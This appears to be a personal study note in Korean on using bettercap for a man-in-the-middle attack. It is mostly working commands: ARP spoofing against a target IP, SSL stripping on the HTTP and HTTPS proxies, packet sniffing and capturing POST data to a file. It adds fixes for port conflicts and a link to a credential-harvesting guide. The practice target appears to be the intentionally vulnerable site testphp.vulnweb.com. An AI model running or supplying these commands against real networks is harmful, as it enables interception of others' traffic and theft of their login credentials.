

# 1. 현재 게이트웨이  mac 주소
arp -a

# 2.  bettercap 

 > Go로 작성 



set http.proxy.sslstrip true
set net.sniff.verbose false
set arp.spoof.targets 대상IP
set arp.spoof.fullduplex true
arp.spoof on
http.proxy on
net.sniff on

bettercap -T [local IP] --proxy-https -P POST -O [filename]


# 3. 

net.probe on
set http.proxy.sslstrip true
set https.proxy.sslstrip true
http.proxy on
https.proxy on
set arp.spoof.targets 192.168.1.199
set arp.spoof.fullduplex true
set net.sniff.verbose false

net.sniff on
arp.spoof on 


- 옛날
bettercap -T [local IP] --proxy-https -P POST -O [filename]
bettercap -T 192.168.1.199 --proxy-https -P POST


- url 입력 시 https를 빼고 도메인명만 입력  
- 다음 시도 -> 리다이렉트 포트 

**오류**

- 이미 사용중인 포트 
```
netstat -tulpn 

pid 확인 후 해당 프로세스 kill 

// 포트 변경하고 싶을때 bettercap 에서 
set http.proxy.port 8011
set https.proxy.port 8011

```


# 옵션 

- net.sniff
```
net.sniff.verbose

true: 모든 패킷 표시
false: 애플리케이션 계층에서 구문 분석된 패킷만표시 
```


- vulnweb id pw
```
test
thisisdummypassword
```


> reference
https://www.bettercap.org/legacy/index.html#http
https://www.bettercap.org/modules/ethernet/proxies/https.proxy/

https://blog.hackerassociate.com/how-to-get-user-credentials-using-bettercap/

http://testphp.vulnweb.com/


https://www.reddit.com/r/Kalilinux/comments/15axv07/bettercap_arp_spoofing_issue/?rdt=51193

https://guleum-zone.tistory.com/82